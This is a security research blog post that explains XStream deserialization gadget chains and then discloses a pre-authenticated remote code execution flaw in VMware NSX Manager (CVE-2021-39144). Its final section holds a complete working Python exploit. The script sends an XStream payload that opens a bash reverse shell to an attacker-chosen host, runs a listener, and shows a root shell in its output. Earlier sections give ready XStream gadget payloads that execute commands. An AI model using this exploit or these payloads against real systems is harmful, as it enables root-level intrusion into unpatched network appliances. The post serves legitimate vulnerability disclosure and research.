---
layout: post
title: "Eat What You Kill :: Pre-authenticated Remote Code Execution in VMWare NSX Manager"
date: 2022-10-25 09:00:00 -0500
categories: blog
---

![](/assets/images/eat-what-you-kill-pre-authenticated-remote-code-execution-in-vmware-nsx-manager/logo.png "NSX Manager")

> This blog post was authored by [Sina Kheirkhah](https://twitter.com/SinSinology). Sina is a past student of the [Full Stack Web Attack](/training/) class.
>

VMWare NSX Manager is vulnerable to a pre-authenticated remote code execution vulnerability and at the time of writing, ~~will not be patched due to [EOL](https://kb.vmware.com/s/article/2149616)~~ this was patched in [VMSA-2022-0027](https://www.vmware.com/security/advisories/VMSA-2022-0027.html). The following blog is a collaboration between myself and the [Steven Seeley](https://twitter.com/steventseeley) who has helped me tremendously along the way.

<!--more-->

Before we begin with the vulnerability, let's have an overview of `XStream`.

![](/assets/images/eat-what-you-kill-pre-authenticated-remote-code-execution-in-vmware-nsx-manager/xstream.png "XStream")

`XStream` is a set of concise and easy-to-use open-source class libraries for marshalling Java objects into XML or unmarshalling XML into Java objects. It is a two-way converter between Java objects and XML.

**Serialization:**

```java
XStream XS = new XStream();
Person person = new Person();
person.setName("sinsinology");

System.out.println(XS.toXML(person));
```

```xml
<Person.Person>
  <Name>sinsinology</Name>
</Person.Person>
```

**Deserialization:**

```java
XStream XS = new XStream();
Person imported = (Person) XS.fromXML(
                "<Person.Person>\n" +
                "  <Name>sinsinology</Name>\n" +
                "</Person.Person>\n");

System.out.println(imported.getName()); // sinsinology
```

XStream uses Java reflection to translate the Person type to and from XML.

XStream also understands the concept of Alias, this worth remembering 

```java
XStream XS = new XStream();
XS.alias("srcincite", Person.class);
Person imported = (Person) XS.fromXML(
                "<srcincite>\n" +
                "  <Name>mr_me</Name>\n" +
                "</srcincite>\n");

System.out.println(imported.getName()); // mr_me
```

In addition to user-defined types like *Person*, `XStream` recognizes core Java types out of the box. For example, `XStream` can read a *Map* from XML:

```java
String xml = "" 
    + "<map>" 
    + "  <element>" 
    + "    <string>foo</string>" 
    + "    <int>10</int>" 
    + "  </element>" 
    + "</map>";
XStream xStream = new XStream();

Map<String, Integer> map = (Map<String, Integer>) xStream.fromXML(xml);
```

## What makes XStream Lovely

If you haven't noticed so far with the *Person* example, `XStream` has an awesome feature and that is, when it unmarshalls an object, it doesn't need the object to implement the `Serializable` interface. This is one of the core differences between marshallers and serializers. This greatly facilitates injection attacks increasing the number of ways which you can exploit `XStream`, not depending only on classes which implement `Serializable`.

There is a catch though. Assume you want to have the below payload unmarshalled:

```java
new ProcessBuilder().command("calc").start();
```

You can instantiate the `ProcessBuilder` and set the command for it, but it's not possible to invoke the `start` method because when marshalling the XML, `XStream` only invokes constructors and sets fields. Therefore, the attacker doesn't have a straightforward way to invoke the arbitrary methods unless they are setters.

## Dynamic Proxies

Dynamic proxies are a design pattern in Java which provides a proxy for a certain object, and the proxy object controls the access to the real object. The proxy class is mainly responsible for **pre-processing** the message for the proxied class (real object), filtering the message, and then passing the message to the proxied class, and finally return the **post-processed** message. In a nutshell a proxy class will complete a call by calling the proxied class and encapsulating the execution result.

Accessing the target object through a Proxy is very powerful since you can redirect execution from an undesired method call to a targeted method call without modifying any code. Simply put, proxies are fronts or wrappers that pass function invocation through their own facilities (onto real methods) – potentially adding some functionality.

Great thing about dynamic proxy is it can pretend to be an implementation of any interface and **it routes all method invocations to a single handler which is the `invoke()` method** 

Now proxies in java can get divided into static and dynamic but for now, we just need to know about the dynamic proxy. In order to start using dynamic proxies in Java we'll need to implement the `InvocationHandler` interface. The class that implements `InvocationHandler` will contain the custom code which will do the **pre-processing** before proxying a call to the target object.

```java
package src.incite;

import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;
import java.lang.reflect.*;

class ProxyHandler implements InvocationHandler {
    private Object obj;
    public ProxyHandler(Object obj) {
        this.obj = obj;
    }
    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        Object result = method.invoke(obj, args);
        System.out.println(String.format("[PROXY] The %s method got invoked", method.getName() ));
        return result;
    }
}

public class Test {
    public static void main(String[] args) throws Exception {
        @SuppressWarnings("unchecked")
        Map<String, Integer> colors = (Map<String, Integer>)Proxy.newProxyInstance(
                Test.class.getClassLoader(),
                new Class[] {Map.class},
                new ProxyHandler(new HashMap<>())
        );
        colors.put("one", 1);
        colors.put("two", 2);
        colors.put("three", 3);
    }
}

```

Output...

```
[PROXY] The put method got invoked
[PROXY] The put method got invoked
[PROXY] The put method got invoked
```

Let's take a closer look at the `invoke` method signature:

```java
invoke(Object proxy, Method method, Object[] args)
```

The three important parameters are:

- `proxy`: the object being proxied
- `method`: the method to call
- `args`: parameters in the method

Looking at our proxy you'll soon realize we are doing the pre-processing but not the post-processing which in this case does not matter that much. We are only interested in getting our custom code to be executed but if you are interested to learn more about dynamic proxies I'll highly recommend checking out [Baeldung](http://twitter.com/baeldung) post about [dynamic proxies](https://www.baeldung.com/java-dynamic-proxies).

## Java Event Handlers

The JDK provides a commonly-used `InvocationHandler` called `java.beans.EventHandler`. This class can be instantiated to invoke a defined method on another object when a particular method (or even ANY method) is invoked.

```java
    public static <T> T create(Class<T> listenerInterface,
                               Object target, String action)					
```

We know that arbitrary code can be executed by invoking the `start` method on a `ProcessBuilder` instance. Now that we can use `EventHandler` to redirect any receiving method invocation request to arbitrary method (in this case the `start` method of a `ProcessBuilder` instance). First though, we need to find a data type that will do a method invocation on our `EventHandler`.

Luckily Java has a interface named `Comparable`. Alvaro [discovered nearly 10 years ago](https://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/) that whenever a `TreeSet` is created and it's generic has been set to `Comparable` , the `TreeSet` constructor will invoke the `compareTo` method of all the members which get added to the `TreeSet`. The reason for this is because a `TreeSet` instance is supposed to be an **ordered data structure** and to keep the order, a comparison must be done.

Now that you know about `TreeSet` and `Comparable`, it's possible to achieve automatic code execution by marshalling a `TreeSet` that contains objects that implement the `Comparable` interface such as a `String` or `Integer`. When the `TreeSet` is unmarshalled and instantiated, the `Comparable` interface methods are automatically called in order to sort the elements of the `TreeSet`.

```java
public final class String
    implements java.io.Serializable, Comparable<String>, CharSequence {
	
public final class Integer extends Number implements Comparable<Integer> {
```

The following code throws an exception before we reach the `toXML` method:

```java
Set<Comparable> set = new TreeSet<Comparable>();
set.add("foo");
set.add(EventHandler.create(Comparable.class, new ProcessBuilder("gnome-calculator"), "start"));
String payload = xstream.toXML(set);
System.out.println(payload);
```

```
Exception in thread "main" java.lang.ClassCastException: java.lang.UNIXProcess cannot be cast to java.lang.Integer
    at com.sun.proxy.$Proxy0.compareTo(Unknown Source)
    at java.util.TreeMap.put(TreeMap.java:568)
    at java.util.TreeSet.add(TreeSet.java:255)
    at src.incite.Test.main(Test.java:45)
```

However, it essentially it boils down to the following payload:

```xml
<sorted-set>
    <string>foo</string>
    <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="java.beans.EventHandler">
            <target class="java.lang.ProcessBuilder">
                <command>
                    <string>gnome-calculator</string>
                </command>
            </target>
            <action>start</action>
        </handler>
    </dynamic-proxy>
</sorted-set>
```

1. A `TreeSet` gets instantiated
2. Its members get populated
3. The `TreeSet` will invoke `compareTo` method on every member
4. The second member is a dynamic proxy which is delegating all method invocation to an `EventTarget`
5. The `EventTarget` of type `ProcessBuilder` gets instantiated with its command field set to `gnome-calculator`
6. `EventHandler` will call the `start` method of `EventTarget`
7. `ProcessBuilder` runs the arbitrary command

## Anything other than Dynamic Proxy?

I have decided to also share another instance of `XStream` arbitrary code execution so you can better understand other possibilities. When it comes to creating gadgets for `XStream`, it's worth mentioning that looking at the current classes in the class path can help you find new gadgets, an example of this is the exploitation of [CVE-2015-3253](https://nvd.nist.gov/vuln/detail/cve-2015-3253) using `XStream`.

In 2016 Jenkins was exploited using the [Groovy Expando gadget](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/http/jenkins_xstream_deserialize.rb#L153) that incorporates the CVE-2015-3253 vector of Groovys `MethodClosure`. Let's study this payload carefully and begin there.

```java
/**
 * Represents a method on an object using a closure which can be invoked
 * at any time
 * 
 */
public class MethodClosure extends Closure {

    private String method;

    public MethodClosure(Object owner , String method ) { // 1
        super(owner); 
        this.method = method ;

        final Class clazz = owner.getClass()==Class.class?(Class) owner:owner.getClass();

        maximumNumberOfParameters = 0;
        parameterTypes = new Class [0];

        List<MetaMethod> methods = InvokerHelper.getMetaClass(clazz).respondsTo(owner, method);

        for(MetaMethod m : methods) {
            if (m.getParameterTypes().length > maximumNumberOfParameters) {
                Class[] pt = m.getNativeParameterTypes();
                maximumNumberOfParameters = pt.length;
                parameterTypes = pt;
            }
        }
    }

    public String getMethod() {
        return method;
    }

    protected Object doCall(Object arguments ) { 
        return InvokerHelper.invokeMethod(getOwner(), method, arguments); // 2
    }

    public Object getProperty(String property) {
        if ("method".equals(property)) {
            return getMethod();
        } else  return super.getProperty(property);
    }
}
```

Looking at the class description, you can see that you can use it to call the method of the object, and it inherits the `Closure` class. The `doCall`method, will call our arbitrary object method directly using reflection. An object instance and method name are all we need to pass in through the constructor. Let's take a look at the parent class (which is `Closure`): 

![](/assets/images/eat-what-you-kill-pre-authenticated-remote-code-execution-in-vmware-nsx-manager/MethodClosure.png "MethodClosure class hierarchy and inheritance")

```java
    public V call() { // 3
        final Object[] NOARGS = EMPTY_OBJECT_ARRAY;
        return call(NOARGS);
    }

    @SuppressWarnings("unchecked")
    public V call(Object... args) {
        try {
            return (V) getMetaClass().invokeMethod(this,"doCall",args); // 4
        } catch (InvokerInvocationException e) {
            ExceptionUtils.sneakyThrow(e.getCause());
            return null; // unreachable statement
        }  catch (Exception e) {
            return (V) throwRuntimeException(e);
        }
    }
```

The `doCall` method of `MethodClosure` class can be called by using the `call` method of the parent class, why this much pain? well if you remember the `doCall` in `MethodClosure` has the `protected` access modifier which means the method can be accessed within the class and by classes derived from that class. As you can see at *[3]* the `call` function is invoking the `doCall` method at *[4]* from the `getMetaClass()` which is the `MethodClosure` instance.

The following code can execute the pop-up calculator:

```java
MethodClosure methodClosure = new MethodClosure(new java.lang.ProcessBuilder("gnsome-calculator"), "start");
methodClosure.call(); // Clojure.call() --> getMetaClass().invokeMethod(this, "doCall",args);
```

Now that we have all this explained, we have another question to answer and that is, how can we invoke the `call` method with `XStream`? since direct method invocation is not possible on the unmarshalled data we need a gadget chain!

## Groovy Expando

Groovy provides a class named `Expando` which inherits from the `GroovyObject` parent class:

![](/assets/images/eat-what-you-kill-pre-authenticated-remote-code-execution-in-vmware-nsx-manager/Expando.png "Expando class hierarchy and inheritance")

```java
public interface GroovyObject {

    /**
     * Invokes the given method.
     *
     * @param name the name of the method to call
     * @param args the arguments to use for the method call
     * @return the result of invoking the method
     */
    Object invokeMethod(String name, Object args);

    /**
     * Retrieves a property value.
     *
     * @param propertyName the name of the property of interest
     * @return the given property
     */
    Object getProperty(String propertyName);

    /**
     * Sets the given property to the new value.
     *
     * @param propertyName the name of the property of interest
     * @param newValue     the new value for the property
     */
    void setProperty(String propertyName, Object newValue);

    /**
     * Returns the metaclass for a given class.
     *
     * @return the metaClass of this instance
     */
    MetaClass getMetaClass();

    /**
     * Allows the MetaClass to be replaced with a derived implementation.
     *
     * @param metaClass the new metaclass
     */
    void setMetaClass(MetaClass metaClass);
}
```

Every Groovy object (In this case `Expando`) must implement their own `getProperty`, `setProperty`, `invokeMethod`, `getMetaClass` and `setMetaClass` methods.

## Why do we care about Expando?

In the `Expando` class, the method `call` is invoked. Here is the `hashCode` method:

```java
    public int hashCode() {
        Object method = getProperties().get("hashCode"); // 1
        if (method != null && method instanceof Closure) {
            // invoke overridden hashCode closure method
            Closure closure = (Closure) method; // 2
            closure.setDelegate(this);
            Integer ret = (Integer) closure.call(); // 3
            return ret.intValue();
        } else {
            return super.hashCode();
        }
```

The code at *[1]* will get the property called `hashCode` and cast it to a `Closure` type at *[2]* and finally call `call` on it at *[3]*. The question now remains, how are we going to automatically call the `hashCode` on our `Expando` object? `hashCode` is called when objects keys are compared and we can create a `HashMap` to put the `Expando` object in as one of its members so that when the `hashMap` is getting instantiated during the unmarshalling, the `hashCode` method will be called.

The characteristics of the Map data structure are used here:

> Map is a key-value type of data structure, so Map sets are not allowed to have duplicate keys. So, every time you add a key-value pair to the collection, it will judge whether the keys are equal, then the `hashCode` method of the key will be called when judging whether they are equal.
> 

When a HashMap is instantiated, the `put` method is called to fill the `Map`. Below is the implementation of `put`:

```
public V put(K key, V value) {
    if (key == null)
        return putForNullKey(value);
    int hash = hash(key.hashCode());  // 4
    int i = indexFor(hash, table.length);
    for (Entry<K,V> e = table[i]; e != null; e = e.next) {
        Object k;
        if (e.hash == hash && ((k = e.key) == key || key.equals(k))) {
            V oldValue = e.value;
            e.value = value;
            e.recordAccess(this);
            return oldValue;
        }
    }

    modCount++;
    addEntry(hash, key, value, i);
    return null;
}
```

At *[4]* `hashCode` is called, which means we can finally get code injection upon object reconstruction:

```java
MethodClosure methodClosure = new MethodClosure(new ProcessBuilder("gnome-calculator"), "start");
Expando maliciousPanda = new Expando();
maliciousPanda.setProperty("hashCode", methodClosure);
HashMap<Expando, Integer> mymap = new HashMap();
mymap.put(maliciousPanda, 123); // triggers gnome-calculator
```

It's also worth mentioning, in order to produce the gadget for Groovy `MethodClosure` in `XStream`, you need to do one slight trick:

```java
public class Main {
    public static void main(String[] args) throws Exception {
        Map map = new HashMap<Expando, Integer>();
        Expando expando = new Expando();
        MethodClosure methodClosure = new MethodClosure(new java.lang.ProcessBuilder(cmd), "start");
        //To avoid throwing an exception, change the hashCode to another name for the time being. 
        expando.setProperty( "InciteTeam_hashCode" , methodClosure);
				map.put(expando, 1337 );
        //Serialize the object
        XStream xs = new XStream();
        String payload =  xs.toXML(map).replace("InciteTeam_hashCode", "hashCode");
        return payload;  
    }
}
```

The reason we set the property to `InciteTeam_hashCode` is because the `hashCode` method of the `Expando` instance will look for the `hashCode` property and will execute our gadget if its available. We can't marshal the payload to XML correctly without executing the gadget on our own system! By doing a small trick and setting the property name to `InciteTeam_hashCode` and modifying the name after marshalling, it's possible to prevent the exception and have our payload displayed.

Here is the produced payload:

```xml
<map>
  <entry>
    <groovy.util.Expando>
      <expandoProperties>
        <entry>
          <string>hashCode</string>
          <org.codehaus.groovy.runtime.MethodClosure>
            <delegate class="java.lang.ProcessBuilder">
              <command>
                <string>calc</string>
              </command>
              <redirectErrorStream>false</redirectErrorStream>
            </delegate>
            <owner class="java.lang.ProcessBuilder" reference="../delegate"/>
            <resolveStrategy>0</resolveStrategy>
            <directive>0</directive>
            <parameterTypes/>
            <maximumNumberOfParameters>0</maximumNumberOfParameters>
            <method>start</method>
          </org.codehaus.groovy.runtime.MethodClosure>
        </entry>
      </expandoProperties>
    </groovy.util.Expando>
    <int>1337</int>
  </entry>
</map>
```

Now that you have a pretty good understanding of `XStream` and its exploitation, let's move on to the exploitation of VMWare NSX Manager.

## Vulnerability Analysis

In XStream <= `1.4.18` there is a deserialization of untrusted data and is tracked as `CVE-2021-39144`. VMWare NSX Manager uses the package `xstream-1.4.18.jar` so it is vulnerable to this deserialization vulnerability. All we need to do is find an endpoint that is reachable from an unauthenticated context to trigger the vulnerability.

I found an authenticated case but upon showing Steven, he found another location in the `/home/secureall/secureall/sem/WEB-INF/spring/security-config.xml` configuration. This particular endpoint is pre-authenticated due to the use of `isAnonymous`. 

```xml
    <http auto-config="false" use-expressions="true" entry-point-ref="authenticationEntryPoint" create-session="stateless">
        <csrf disabled="true" />
        <!-- ... -->
        <intercept-url pattern="/api/2.0/services/usermgmt/password/**" access="isAnonymous()" />
        <intercept-url pattern="/api/2.0/services/usermgmt/passwordhint/**" access="isAnonymous()" />
        <!-- ... -->
        <custom-filter position="BASIC_AUTH_FILTER" ref="basicSSOAuthNFilter"/>
        <custom-filter position="PRE_AUTH_FILTER" ref="preAuthFilter"/>
        <custom-filter after="SECURITY_CONTEXT_FILTER" ref="jwtAuthFilter"/>
        <custom-filter before="BASIC_AUTH_FILTER" ref="unamePasswordAuthFilter"/>
    </http>
```

We can see the an API function call in the `com.vmware.vshield.vsm.usermgmt.restcontroller.UserMgmtController` class:

```java    
    @RequestMapping(value = { "/password/{userId}" }, method = { RequestMethod.PUT })
    @ResponseStatus(HttpStatus.NO_CONTENT)
    @CheckBlacklist(userId = "#userId", remoteAddress = "#request.getRemoteAddr")
    public void resetPassword(@PathVariable("userId") String userId, @RequestBody final SecurityProfileDto securityProfileDto, final HttpServletRequest request) {
        final JoinPoint jp = Factory.makeJP(UserMgmtController.ajc$tjp_13, this, this, new Object[] { userId, securityProfileDto, request });
        resetPassword_aroundBody29$advice(this, userId, securityProfileDto, request, jp, RequestBodyValidatorAspect.aspectOf(), (ProceedingJoinPoint)jp);
    }
```

The `resetPassword` method uses the `@RequestBody` with a `SecurityProfileDto` type which sets the serializer to `XStream` making it the perfect candidate for exploitation:

```java
/*    */ @XStreamAlias("securityProfile")
/*    */ public class SecurityProfileDto
```

An attacker can send a specially crafted `XStream` marshalled payload with a dynamic proxy and trigger remote code execution in the context of root!

## Proof of Concept

<img src="/assets/images/eat-what-you-kill-pre-authenticated-remote-code-execution-in-vmware-nsx-manager/popthyshell.png" alt="Courtesy of @lystena" />

*Image Courtesy of [@lystena](https://twitter.com/lystena)*

```py
#!/usr/bin/env python3
"""
VMWare NSX Manager XStream Deserialization of Untrusted Data Remote Code Execution Vulnerability
Version: 6.4.13-19307994
File: VMware-NSX-Manager-6.4.13-19307994-disk1.vmdk
SHA1: f828eccd50d5f32500fb1f7a989d02bddf705c45
Found by: Sina Kheirkhah of MDSec and Steven Seeley of Source Incite
"""

import socket
import sys
import requests
from telnetlib import Telnet
from threading import Thread
from urllib3 import disable_warnings, exceptions
disable_warnings(exceptions.InsecureRequestWarning)

xstream = """
<sorted-set>
    <string>foo</string>
    <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="java.beans.EventHandler">
            <target class="java.lang.ProcessBuilder">
                <command>
                    <string>bash</string>
                    <string>-c</string>
                    <string>bash -i &#x3e;&#x26; /dev/tcp/{rhost}/{rport} 0&#x3e;&#x26;1</string>
                </command>
            </target>
            <action>start</action>
        </handler>
    </dynamic-proxy>
</sorted-set>"""

def handler(lp):
    print(f"(+) starting handler on port {lp}")
    t = Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", lp))
    s.listen(1)
    conn, addr = s.accept()
    print(f"(+) connection from {addr[0]}")
    t.sock = conn
    print("(+) pop thy shell!")
    t.interact()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"(+) usage: {sys.argv[0]} <target> <connectback:port>")
        print(f"(+) eg: {sys.argv[0]} 192.168.18.135 172.18.182.204:1234")
        sys.exit(1)
    target = sys.argv[1]
    rhost  = sys.argv[2]
    rport  = 1234
    if ":" in sys.argv[2]:
        assert sys.argv[2].split(":")[1].isdigit(), "(-) didnt supply a valid port"
        rport = int(sys.argv[2].split(":")[1])
        rhost = sys.argv[2].split(":")[0]
    handlerthr = Thread(target=handler, args=[rport])
    handlerthr.start()
    # trigger rce
    requests.put(
        f"https://{target}/api/2.0/services/usermgmt/password/1337", 
        data=xstream.format(rhost=rhost, rport=rport), 
        headers={
            'Content-Type': 'application/xml'
        }, 
        verify=False
    )
```

## Example:

```
researcher@neophyte:~$ ./poc.py
(+) usage: ./poc.py <target> <connectback:port>
(+) eg: ./poc.py 192.168.18.135 172.18.182.204:1234

researcher@neophyte:~$ ./poc.py 192.168.18.135 172.18.182.204:1337
(+) starting handler on port 1337
(+) connection from 172.18.176.1
(+) pop thy shell!
bash: cannot set terminal process group (5847): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.0# id
id
uid=0(root) gid=101(secureall) groups=101(secureall)
```

A big thank you to Steven Seeley for helping me analyse, exploit and triage this vulnerability, I always say this: "that the man is a Wizard!".

## Conclusion

Don't use outdated `XStream`!

## References

- [https://www.vmware.com/security/advisories/VMSA-2022-0027.html](https://www.vmware.com/security/advisories/VMSA-2022-0027.html)
- [https://x-stream.github.io/CVE-2021-39144.html](https://x-stream.github.io/CVE-2021-39144.html)
- [https://github.com/mbechler/marshalsec](https://github.com/mbechler/marshalsec)
- [http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/](http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/)
